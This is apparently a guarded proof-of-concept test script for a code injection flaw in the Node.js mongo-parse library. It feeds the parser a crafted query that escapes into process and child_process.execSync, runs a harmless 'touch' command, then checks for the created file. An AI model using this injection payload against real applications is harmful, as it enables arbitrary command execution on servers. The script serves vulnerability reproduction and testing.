if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
const parser = require("mongo-parse");
const path = "./mongo-parse";
file_exist = fs.existsSync(path);
console.log("a", file_exist);
try {
	let query = parser.parse(
		'} + clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync("touch mongo-parse") //',
	);
} catch (error) {
	console.log(error);
}
setTimeout(() => {
	file_exist = fs.existsSync(path);
	fs.unlink(path, () => {});
	console.log("b", file_exist);

	if (file_exist) {
		process.exit(0);
	} else {
		process.exit(82);
	}
}, 1);
